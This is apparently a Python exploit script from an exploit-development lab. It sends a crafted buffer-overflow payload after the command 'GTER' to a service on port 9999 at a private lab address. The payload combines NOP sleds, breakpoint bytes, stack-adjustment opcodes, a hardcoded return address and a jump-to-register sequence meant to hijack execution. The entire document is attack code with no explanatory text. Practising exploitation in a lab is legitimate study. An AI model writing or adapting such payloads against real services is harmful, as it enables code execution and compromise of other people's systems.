import socket, sys

file_descriptor=b""
file_descriptor+=b"\xcc"
file_descriptor+=b"\x54"
file_descriptor+=b"\x5b"
file_descriptor+=b"\x66\x81\xc3\x88\x01"

stack_adjustment=b""
stack_adjustment+=b"\x83\xec\x70"

payload=b""
payload+=b"\x90"*20
payload+=file_descriptor
payload+=stack_adjustment
payload+=b"\x90"*(100-len(payload))
payload+=b"\xcc"
payload+=b"\x90"*50
payload+=b"\xaf\x11\x50\x62"
payload+=b"\x90"
payload+=b"\x83\xc0\x10"
payload+=b"\xff\xe0"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GTER "+payload))
s.close()
sys.exit()
